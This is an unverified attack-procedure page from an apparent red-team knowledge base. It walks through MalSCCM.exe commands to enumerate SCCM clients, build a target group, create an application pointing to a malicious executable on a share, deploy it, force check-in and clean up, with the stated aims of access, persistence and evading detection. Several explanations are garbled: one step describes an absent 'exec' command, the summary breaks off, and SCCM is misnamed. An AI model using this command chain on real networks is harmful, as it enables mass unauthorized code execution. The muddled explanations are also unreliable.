---
id: f367fd60-eb2d-4718-be46-c6e1d5ca4a83
name: SCCM Deployment Malicious Application Creation and Deployment
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:08.155167+00:00'
updated_at: '2023-04-10T20:26:32.915429+00:00'
tags:
- '[[Active Directory Attacks]]'
- '[[SCCM Deployment]]'
commands:
- '[[Add host to TargetGroup using MalSCCM.exe]]'
- '[[Cleanup demoapp using MalSCCM.exe]]'
- '[[Create demoapp using MalSCCM.exe]]'
- '[[Create TargetGroup using MalSCCM.exe]]'
- '[[Delete TargetGroup using MalSCCM.exe]]'
- '[[Deploy demoapp to TargetGroup]]'
- '[[Inspect all]]'
- '[[Inspect applications using MalSCCM.exe]]'
- '[[Inspect computers]]'
- '[[Inspect deployments]]'
- '[[Inspect groups]]'
- '[[Inspect groups using MalSCCM.exe]]'
- '[[Inspect MalSCCM.exe for Server Groups]]'
- '[[Inspect primary users]]'
- '[[Locate MalSCCM.exe]]'
- '[[MalSCCM checkin for TargetGroup]]'
---

# SCCM Deployment Malicious Application Creation and Deployment

## Summary

This procedure involves creating a malicious application using MalSCCM.exe and deploying it to a target group using SCCM Deployment. The attacker can use this procedure to gain initial access to the target system, escalate privileges, persist on the system, and evade detection. MalSCCM.exe allows t

## Description

# Description

This procedure involves creating a malicious application using MalSCCM.exe and deploying it to a target group using SCCM Deployment. The attacker can use this procedure to gain initial access to the target system, escalate privileges, persist on the system, and evade detection. MalSCCM.exe allows the attacker to create a malicious application and SCCM Deployment allows the attacker to deploy the application to a target group. The business value of this procedure is that it allows the attacker to gain unauthorized access to sensitive data and compromise the target system.

 

## Requirements

1. Access to SCCM Deployment

1. Access to the target system

 

## Defense

1. Limit access to SCCM Deployment to authorized personnel only

1. Implement network segmentation to limit the attacker's ability to move laterally

1. Monitor SCCM Deployment logs for suspicious activity

 

## Objectives

1. Create a malicious application using MalSCCM.exe

1. Deploy the malicious application to a target group using SCCM Deployment

1. Gain initial access to the target system

1. Escalate privileges on the target system

1. Persist on the target system

1. Evade detection

 

# Instructions

1. This command retrieves the details of a device from the SCCM server and then executes a command on that device. The command to be executed can be specified in the 'data' field.

 



**Code**: [[.\SharpSCCM.exe get device --server <SERVER8NAME> ]]



> The 'get device' command retrieves the details of a device from the SCCM server. The '--server' parameter specifies the name of the SCCM server and the '--site-code' parameter specifies the site code of the SCCM server.

The 'exec' command is used to execute a command on the specified device. The '-d' parameter specifies the name of the device to execute the command on and the '-r' parameter specifies the IP address of the relay server. The command to be executed can be specified in the '-p' parameter. The '-s' parameter is used to run the command in silent mode and the '--debug' parameter is used to run the command in debug mode.

2. Use the MalSCCM.exe utility to locate the malicious server that the compromised client is communicating with.

 



**Code**: [[MalSCCM.exe locate]]



> This command is used to identify the management server that a compromised client is communicating with. The MalSCCM.exe utility can be used to identify the IP address or hostname of the malicious server. This information can then be used to block or investigate the server in question.



**Command** ([[Locate MalSCCM.exe]]):

```bash
MalSCCM.exe locate
```



3. To use this command, replace <DistributionPoint Server FQDN> with the fully qualified domain name of your Distribution Point server. This command will enumerate all the groups associated with the Distribution Point.

 



**Code**: [[MalSCCM.exe inspect /server:<DistributionPoint Ser]]



> This command uses MalSCCM.exe to inspect the Distribution Point server over WMI. It requires administrative privileges to execute. The /groups argument is used to specify that we want to enumerate all the groups associated with the Distribution Point. The command will return a list of all the groups along with their details.



**Command** ([[Inspect MalSCCM.exe for Server Groups]]):

```bash
MalSCCM.exe inspect /server:<DistributionPoint Server FQDN> /groups
```



4. To inspect SCCM clients, run the `MalSCCM.exe` command followed by the `inspect` parameter. You can specify the following arguments:
- `/all`: to view all clients in SCCM
- `/computers`: to view only computer clients
- `/primaryusers`: to view only primary user clients
- `/groups`: to view only group clients

For example, to view all clients in SCCM, run: `MalSCCM.exe inspect /all`

 



**Code**: [[MalSCCM.exe inspect /all
MalSCCM.exe inspect /comp]]



> The `inspect` command allows you to view the clients that are available for targeting in SCCM. By specifying different arguments, you can filter the results to only show specific types of clients. This can be useful when you want to target a specific group of clients for a deployment or other action.



**Command** ([[Inspect all]]):

```bash
MalSCCM.exe inspect /all
```





**Command** ([[Inspect computers]]):

```bash
MalSCCM.exe inspect /computers
```





**Command** ([[Inspect primary users]]):

```bash
MalSCCM.exe inspect /primaryusers
```





**Command** ([[Inspect groups]]):

```bash
MalSCCM.exe inspect /groups
```



5. To create a new device group using MalSCCM.exe, run the following command:

MalSCCM.exe group /create /groupname:<Group Name> /grouptype:device

Replace <Group Name> with the desired name for your group. This will create a new device group in MalSCCM.exe.

To inspect the groups in MalSCCM.exe, run the following command:

MalSCCM.exe inspect /groups

 



**Code**: [[MalSCCM.exe group /create /groupname:TargetGroup /]]



> The 'group' command in MalSCCM.exe is used to manage device groups in Malware System Center Configuration Manager (MalSCCM). This command can be used to create, delete, or modify device groups.

To create a new device group, use the '/create' switch followed by the desired group name and group type (in this case, 'device').

The 'inspect' command can be used to view information about groups in MalSCCM. In this case, running 'MalSCCM.exe inspect /groups' will display a list of all device groups currently in MalSCCM.



**Command** ([[Create TargetGroup using MalSCCM.exe]]):

```bash
MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device
```





**Command** ([[Inspect groups using MalSCCM.exe]]):

```bash
MalSCCM.exe inspect /groups
```



6. To add hosts to the target group, run the following command:

 



**Code**: [[MalSCCM.exe group /addhost /groupname:TargetGroup ]]



> This command adds a host to the specified target group. The /groupname argument specifies the name of the target group, and the /host argument specifies the name of the host to be added to the group. You can add multiple hosts to the group by specifying them one after the other separated by a space.



**Command** ([[Add host to TargetGroup using MalSCCM.exe]]):

```bash
MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL
```



7. To create a new application using MalSCCM.exe, run the following command:

MalSCCM.exe app /create /name:<application_name> /uncpath:"<path_to_exe_file>"

To inspect the created applications using MalSCCM.exe, run the following command:

MalSCCM.exe inspect /applications

 



**Code**: [[MalSCCM.exe app /create /name:demoapp /uncpath:"\\]]



> This command creates a new application using MalSCCM.exe and points to a malicious executable file located on a world-readable share named `SCCMContentLib$`. The created application can be inspected using the `MalSCCM.exe inspect /applications` command. The `app` command is used to create a new application and the `/name` parameter specifies the name of the application. The `/uncpath` parameter specifies the path to the executable file. The `inspect` command is used to inspect created applications.



**Command** ([[Create demoapp using MalSCCM.exe]]):

```bash
MalSCCM.exe app /create /name:demoapp /uncpath:"\\BLORE-SCCM\SCCMContentLib$\localthread.exe"
```





**Command** ([[Inspect applications using MalSCCM.exe]]):

```bash
MalSCCM.exe inspect /applications
```



8. To deploy the demoapp to the TargetGroup, run the following command in PowerShell:
MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment

This command will deploy the demoapp to the TargetGroup with the name demodeployment.

 



**Code**: [[MalSCCM.exe app /deploy /name:demoapp /groupname:T]]



> The 'MalSCCM.exe app' command is used to deploy an application to a group in SCCM. The '/deploy' flag is used to indicate that the application should be deployed. The '/name' flag specifies the name of the application to be deployed, in this case 'demoapp'. The '/groupname' flag specifies the name of the target group, in this case 'TargetGroup'. The '/assignmentname' flag specifies the name of the deployment assignment, in this case 'demodeployment'.

The 'MalSCCM.exe inspect' command is used to inspect the deployments in SCCM. In this case, it is being used to verify that the deployment was successful.



**Command** ([[Deploy demoapp to TargetGroup]]):

```bash
MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment
```





**Command** ([[Inspect deployments]]):

```bash
MalSCCM.exe inspect /deployments
```



9. To force the Target Group to check-in for updates, run the following command in PowerShell:

 



**Code**: [[MalSCCM.exe checkin /groupname:TargetGroup]]



> This command uses the MalSCCM.exe tool to force the specified Target Group to check-in for updates. The /groupname parameter specifies the name of the Target Group to be checked in. This command is useful when you need to ensure that the Target Group has received the latest updates and is up-to-date with the latest changes.



**Command** ([[MalSCCM checkin for TargetGroup]]):

```bash
MalSCCM.exe checkin /groupname:TargetGroup
```



10. To use this command, run the following command in PowerShell:
MalSCCM.exe app /cleanup /name:demoapp
MalSCCM.exe group /delete /groupname:TargetGroup

This command will cleanup the demo application and group from the SCCM server.

 



**Code**: [[MalSCCM.exe app /cleanup /name:demoapp
MalSCCM.exe]]



> The 'MalSCCM.exe' command is used to perform various operations on the SCCM server. In this case, the 'app' command is used to cleanup the application and the 'group' command is used to delete the group.

The '/cleanup' switch is used to remove the application and its deployment from the SCCM server.

The '/name' switch is used to specify the name of the application to be cleaned up.

The '/delete' switch is used to delete the group from the SCCM server.

The '/groupname' switch is used to specify the name of the group to be deleted.



**Command** ([[Cleanup demoapp using MalSCCM.exe]]):

```bash
MalSCCM.exe app /cleanup /name:demoapp
```





**Command** ([[Delete TargetGroup using MalSCCM.exe]]):

```bash
MalSCCM.exe group /delete /groupname:TargetGroup
```



## Commands Used

- [[Add host to TargetGroup using MalSCCM.exe]]
- [[Cleanup demoapp using MalSCCM.exe]]
- [[Create demoapp using MalSCCM.exe]]
- [[Create TargetGroup using MalSCCM.exe]]
- [[Delete TargetGroup using MalSCCM.exe]]
- [[Deploy demoapp to TargetGroup]]
- [[Inspect all]]
- [[Inspect applications using MalSCCM.exe]]
- [[Inspect computers]]
- [[Inspect deployments]]
- [[Inspect groups]]
- [[Inspect groups using MalSCCM.exe]]
- [[Inspect MalSCCM.exe for Server Groups]]
- [[Inspect primary users]]
- [[Locate MalSCCM.exe]]
- [[MalSCCM checkin for TargetGroup]]

## Tags

- [[Active Directory Attacks]]
- [[SCCM Deployment]]


